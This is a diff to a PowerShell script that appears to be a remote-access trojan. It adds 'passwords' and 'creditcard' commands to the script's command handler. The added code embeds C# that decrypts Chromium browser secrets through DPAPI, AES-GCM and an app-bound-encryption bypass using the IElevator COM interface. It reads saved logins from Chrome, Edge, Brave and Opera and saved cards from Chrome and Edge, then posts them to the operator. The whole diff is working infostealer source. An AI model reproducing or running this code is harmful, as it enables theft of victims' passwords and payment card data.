@@ -430,9 +430,238 @@ function Run-Cmd($c){
           Remove-Item $HF -Force -EA 0
           Post '`[+] uninstalled`'; exit
         }
+    elseif($c -eq 'passwords'){ Get-Passwords }
+    elseif($c -eq 'creditcard'){ Get-CreditCards }
     elseif($c -eq 'whoami'){ Post (whoami) }
     else { Post "`[?] unknown: $c" }
   }catch{}
+}
+
+
+
+# ---- Credential + card theft ----
+$script:StealLoaded = $false
+function Ensure-Steal {
+  if ($script:StealLoaded) { return }
+  Add-Type -TypeDefinition @'
+using System;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Collections.Generic;
+
+public class StealCore {
+    [StructLayout(LayoutKind.Sequential)]
+    public struct BLOB { public int cbData; public IntPtr pbData; }
+    [DllImport("crypt32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
+    static extern bool CryptUnprotectData(ref BLOB pDataIn, IntPtr szDesc, ref BLOB pOptional, IntPtr pvReserved, IntPtr pPrompt, int dwFlags, ref BLOB pDataOut);
+    [DllImport("kernel32.dll")]
+    static extern IntPtr LocalFree(IntPtr hMem);
+    public static byte[] DPAPI(byte[] data) {
+        if (data == null || data.Length == 0) return null;
+        BLOB ib = new BLOB(); BLOB ob = new BLOB(); BLOB opt = new BLOB();
+        ib.cbData = data.Length; ib.pbData = Marshal.AllocHGlobal(data.Length);
+        Marshal.Copy(data, 0, ib.pbData, data.Length);
+        if (CryptUnprotectData(ref ib, IntPtr.Zero, ref opt, IntPtr.Zero, IntPtr.Zero, 0, ref ob)) {
+            byte[] r = new byte[ob.cbData]; Marshal.Copy(ob.pbData, r, 0, ob.cbData);
+            LocalFree(ob.pbData); Marshal.FreeHGlobal(ib.pbData); return r;
+        }
+        Marshal.FreeHGlobal(ib.pbData); return null;
+    }
+    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)] static extern int sqlite3_open(byte[] f, out IntPtr db);
+    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)] static extern int sqlite3_close(IntPtr db);
+    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)] static extern int sqlite3_prepare_v2(IntPtr db, byte[] sql, int nByte, out IntPtr stmt, IntPtr tail);
+    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)] static extern int sqlite3_step(IntPtr stmt);
+    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)] static extern int sqlite3_finalize(IntPtr stmt);
+    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)] static extern IntPtr sqlite3_column_text(IntPtr stmt, int c);
+    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)] static extern IntPtr sqlite3_column_blob(IntPtr stmt, int c);
+    [DllImport("winsqlite3.dll", CallingConvention=CallingConvention.Cdecl)] static extern int sqlite3_column_bytes(IntPtr stmt, int c);
+    static byte[] E(string s) { return Encoding.UTF8.GetBytes(s); }
+    static string T(IntPtr p, int n) { if (p == IntPtr.Zero || n <= 0) return ""; byte[] b = new byte[n]; Marshal.Copy(p, b, 0, n); return Encoding.UTF8.GetString(b); }
+    static byte[] B(IntPtr p, int n) { if (p == IntPtr.Zero || n <= 0) return null; byte[] b = new byte[n]; Marshal.Copy(p, b, 0, n); return b; }
+    [DllImport("bcrypt.dll", CharSet=CharSet.Unicode)] static extern int BCryptOpenAlgorithmProvider(out IntPtr alg, string id, string impl, int flags);
+    [DllImport("bcrypt.dll", CharSet=CharSet.Unicode)] static extern int BCryptSetProperty(IntPtr h, string prop, byte[] val, int cb, int flags);
+    [DllImport("bcrypt.dll")] static extern int BCryptGenerateSymmetricKey(IntPtr alg, out IntPtr key, IntPtr keyObj, int cbKeyObj, byte[] secret, int cbSecret, int flags);
+    [DllImport("bcrypt.dll")] static extern int BCryptDecrypt(IntPtr key, byte[] input, int cbInput, IntPtr pPadding, byte[] iv, int cbIV, byte[] output, int cbOutput, ref int pcb, int flags);
+    [DllImport("bcrypt.dll")] static extern int BCryptDestroyKey(IntPtr key);
+    [DllImport("bcrypt.dll")] static extern int BCryptCloseAlgorithmProvider(IntPtr alg, int flags);
+    [StructLayout(LayoutKind.Sequential, Pack=8)]
+    struct AUTH_INFO { public int cbSize; public int dwInfoVersion; public IntPtr pbNonce; public int cbNonce; public IntPtr pbAuthData; public int cbAuthData; public IntPtr pbTag; public int cbTag; public IntPtr pbMacContext; public int cbMacContext; public int cbAAD; public long cbData; public int dwFlags; }
+    public static byte[] GCMDecrypt(byte[] key, byte[] nonce, byte[] ct, byte[] tag) {
+        IntPtr alg = IntPtr.Zero, hKey = IntPtr.Zero, keyObj = IntPtr.Zero, nPtr = IntPtr.Zero, tPtr = IntPtr.Zero, aPtr = IntPtr.Zero;
+        try {
+            if (BCryptOpenAlgorithmProvider(out alg, "AES", null, 0) != 0) return null;
+            byte[] mode = Encoding.Unicode.GetBytes("ChainingModeGCM\0");
+            BCryptSetProperty(alg, "ChainingMode", mode, mode.Length, 0);
+            int objLen = 1024; keyObj = Marshal.AllocHGlobal(objLen);
+            if (BCryptGenerateSymmetricKey(alg, out hKey, keyObj, objLen, key, key.Length, 0) != 0) return null;
+            nPtr = Marshal.AllocHGlobal(nonce.Length); Marshal.Copy(nonce, 0, nPtr, nonce.Length);
+            tPtr = Marshal.AllocHGlobal(tag.Length); Marshal.Copy(tag, 0, tPtr, tag.Length);
+            AUTH_INFO a = new AUTH_INFO(); a.cbSize = Marshal.SizeOf(typeof(AUTH_INFO)); a.dwInfoVersion = 1;
+            a.pbNonce = nPtr; a.cbNonce = nonce.Length; a.pbTag = tPtr; a.cbTag = tag.Length;
+            aPtr = Marshal.AllocHGlobal(a.cbSize); Marshal.StructureToPtr(a, aPtr, false);
+            byte[] outBuf = new byte[ct.Length]; int written = 0;
+            int st = BCryptDecrypt(hKey, ct, ct.Length, aPtr, null, 0, outBuf, outBuf.Length, ref written, 0);
+            if (st != 0) return null;
+            byte[] r = new byte[written]; Array.Copy(outBuf, r, written); return r;
+        } finally {
+            if (aPtr != IntPtr.Zero) Marshal.FreeHGlobal(aPtr);
+            if (nPtr != IntPtr.Zero) Marshal.FreeHGlobal(nPtr);
+            if (tPtr != IntPtr.Zero) Marshal.FreeHGlobal(tPtr);
+            if (hKey != IntPtr.Zero) BCryptDestroyKey(hKey);
+            if (keyObj != IntPtr.Zero) Marshal.FreeHGlobal(keyObj);
+            if (alg != IntPtr.Zero) BCryptCloseAlgorithmProvider(alg, 0);
+        }
+    }
+    public static string DecodePassword(byte[] enc, byte[] key) {
+        if (enc == null || enc.Length < 20) return "";
+        if (enc[0] == (byte)'v' && enc[1] == (byte)'1') {
+            byte[] nonce = new byte[12]; Array.Copy(enc, 3, nonce, 0, 12);
+            int ctLen = enc.Length - 3 - 12 - 16; if (ctLen < 0) return "";
+            byte[] ct = new byte[ctLen]; Array.Copy(enc, 15, ct, 0, ctLen);
+            byte[] tag = new byte[16]; Array.Copy(enc, enc.Length - 16, tag, 0, 16);
+            byte[] k16 = new byte[16]; Array.Copy(key, 0, k16, 0, 16);
+            byte[] pt = GCMDecrypt(k16, nonce, ct, tag);
+            return pt == null ? "" : Encoding.UTF8.GetString(pt);
+        }
+        return "";
+    }
+    public static List<string[]> GetLogins(string db, byte[] key) {
+        var rows = new List<string[]>();
+        IntPtr hdb, stmt;
+        if (sqlite3_open(E(db), out hdb) != 0) return rows;
+        if (sqlite3_prepare_v2(hdb, E("SELECT origin_url,username_value,password_value FROM logins"), -1, out stmt, IntPtr.Zero) != 0) { sqlite3_close(hdb); return rows; }
+        while (sqlite3_step(stmt) == 100) {
+            string url = T(sqlite3_column_text(stmt, 0), sqlite3_column_bytes(stmt, 0));
+            string user = T(sqlite3_column_text(stmt, 1), sqlite3_column_bytes(stmt, 1));
+            byte[] enc = B(sqlite3_column_blob(stmt, 2), sqlite3_column_bytes(stmt, 2));
+            rows.Add(new string[] { url, user, enc == null ? "" : Convert.ToBase64String(enc) });
+        }
+        sqlite3_finalize(stmt); sqlite3_close(hdb);
+        return rows;
+    }
+    public static List<string[]> GetCards(string db, byte[] key) {
+        var rows = new List<string[]>();
+        IntPtr hdb, stmt;
+        if (sqlite3_open(E(db), out hdb) != 0) return rows;
+        if (sqlite3_prepare_v2(hdb, E("SELECT name_on_card,expiration_month,expiration_year,card_number_encrypted FROM credit_cards"), -1, out stmt, IntPtr.Zero) != 0) { sqlite3_close(hdb); return rows; }
+        while (sqlite3_step(stmt) == 100) {
+            string name = T(sqlite3_column_text(stmt, 0), sqlite3_column_bytes(stmt, 0));
+            string em = T(sqlite3_column_text(stmt, 1), sqlite3_column_bytes(stmt, 1));
+            string ey = T(sqlite3_column_text(stmt, 2), sqlite3_column_bytes(stmt, 2));
+            byte[] enc = B(sqlite3_column_blob(stmt, 3), sqlite3_column_bytes(stmt, 3));
+            rows.Add(new string[] { name, em + "/" + ey, enc == null ? "" : Convert.ToBase64String(enc) });
+        }
+        sqlite3_finalize(stmt); sqlite3_close(hdb);
+        return rows;
+    }
+}
+
+public class AppBound {
+    [ComImport, Guid("463ABECF-410D-407F-8AF5-0DF35A005CC8"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
+    public interface IElevator {
+        [PreserveSig] int RunRecoveryCRXElevated([MarshalAs(UnmanagedType.LPWStr)] string a, [MarshalAs(UnmanagedType.LPWStr)] string b, [MarshalAs(UnmanagedType.LPWStr)] string c, [MarshalAs(UnmanagedType.LPWStr)] string d, uint e, out IntPtr f);
+        [PreserveSig] int EncryptData([MarshalAs(UnmanagedType.BStr)] string p, [MarshalAs(UnmanagedType.BStr)] out string c, out uint e);
+        [PreserveSig] int DecryptData([MarshalAs(UnmanagedType.BStr)] string c, [MarshalAs(UnmanagedType.BStr)] out string p, out uint e);
+    }
+    [DllImport("ole32.dll")] static extern int CoCreateInstance(ref Guid rclsid, IntPtr pUnk, uint ctx, ref Guid riid, out IElevator ppv);
+    public static string CryptoServiceDecrypt(string b64, string clsidHex) {
+        Guid clsid = new Guid(clsidHex); Guid iid = new Guid("463ABECF-410D-407F-8AF5-0DF35A005CC8");
+        IElevator el; int hr = CoCreateInstance(ref clsid, IntPtr.Zero, 4, ref iid, out el);
+        if (hr != 0 || el == null) return null;
+        string plain = null; uint err = 0;
+        int dhr = el.DecryptData(b64, out plain, out err);
+        Marshal.ReleaseComObject(el);
+        return plain;
+    }
+}
+'@
+  $script:StealLoaded = $true
+}
+
+function Get-BrowserKey($statePath) {
+  try {
+    $j = Get-Content $statePath -Raw | ConvertFrom-Json
+    $b64 = $j.os_crypt.encrypted_key
+    if (-not $b64) { return $null }
+    $blob = [Convert]::FromBase64String($b64)
+    $dpapi = $blob[5..($blob.Length - 1)]
+    return [StealCore]::DPAPI($dpapi)
+  } catch { return $null }
+}
+
+function Decode-Single($encB64, $key) {
+  if (-not $encB64) { return "" }
+  $enc = [Convert]::FromBase64String($encB64)
+  $r = [StealCore]::DecodePassword($enc, $key)
+  if ($r) { return $r }
+  if ($enc.Length -ge 3 -and $enc[0] -eq [byte]0x76 -and $enc[1] -eq [byte]0x32) {
+    $payload = $enc[3..($enc.Length - 1)]
+    $b64 = [Convert]::ToBase64String($payload)
+    foreach ($c in @('1FCBE96C-1697-43AF-9140-2897C7C69767','708860E0-F641-4611-8895-7D867DD3675B','576B31AF-6369-4B6B-8560-E4B203A97A8B')) {
+      $plain = [AppBound]::CryptoServiceDecrypt($b64, $c)
+      if ($plain) {
+        $v10 = [Convert]::FromBase64String($plain)
+        $rr = [StealCore]::DecodePassword($v10, $key)
+        if ($rr) { return $rr }
+      }
+    }
+    return '[v20:app-bound]'
+  }
+  return ""
+}
+
+function Get-Passwords {
+  Ensure-Steal
+  $hits = New-Object System.Collections.ArrayList
+  $targets = @(
+    @{ n = 'Chrome'; b = "$env:LOCALAPPDATA\Google\Chrome\User Data" },
+    @{ n = 'Edge';   b = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" },
+    @{ n = 'Brave';  b = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data" },
+    @{ n = 'Opera';  b = "$env:APPDATA\Opera Software\Opera Stable" }
+  )
+  foreach ($t in $targets) {
+    $lg = Join-Path $t.b 'Default\Login Data'
+    $st = Join-Path $t.b 'Local State'
+    if (-not (Test-Path $lg) -or -not (Test-Path $st)) { continue }
+    $key = Get-BrowserKey $st
+    if (-not $key) { continue }
+    $tmp = Join-Path $env:TEMP ('ld_' + [Guid]::NewGuid().ToString('N') + '.db')
+    Copy-Item $lg $tmp -Force -EA SilentlyContinue
+    $rows = [StealCore]::GetLogins($tmp, $key)
+    Remove-Item $tmp -Force -EA SilentlyContinue
+    foreach ($r in $rows) {
+      $pw = Decode-Single $r[2] $key
+      if ($pw) { [void]$hits.Add(($t.n + '|' + $r[0] + '|' + $r[1] + '|' + $pw)) }
+    }
+  }
+  if ($hits.Count -eq 0) { Post '[passwords] none'; return }
+  Post ("`[passwords] " + $hits.Count + '`' + "`n" + (($hits -join "`n")))
+}
+
+function Get-CreditCards {
+  Ensure-Steal
+  $hits = New-Object System.Collections.ArrayList
+  $targets = @(
+    @{ n = 'Chrome'; b = "$env:LOCALAPPDATA\Google\Chrome\User Data" },
+    @{ n = 'Edge';   b = "$env:LOCALAPPDATA\Microsoft\Edge\User Data" }
+  )
+  foreach ($t in $targets) {
+    $wd = Join-Path $t.b 'Default\Web Data'
+    $st = Join-Path $t.b 'Local State'
+    if (-not (Test-Path $wd) -or -not (Test-Path $st)) { continue }
+    $key = Get-BrowserKey $st
+    if (-not $key) { continue }
+    $tmp = Join-Path $env:TEMP ('wd_' + [Guid]::NewGuid().ToString('N') + '.db')
+    Copy-Item $wd $tmp -Force -EA SilentlyContinue
+    $rows = [StealCore]::GetCards($tmp, $key)
+    Remove-Item $tmp -Force -EA SilentlyContinue
+    foreach ($r in $rows) {
+      $num = Decode-Single $r[2] $key
+      if ($num) { [void]$hits.Add(($t.n + '|' + $r[0] + '|' + $r[1] + '|' + $num)) }
+    }
+  }
+  if ($hits.Count -eq 0) { Post '[creditcards] none'; return }
+  Post ("`[creditcards] " + $hits.Count + '`' + "`n" + (($hits -join "`n")))
 }
 
 # ---- startup: persist + boot notify ----
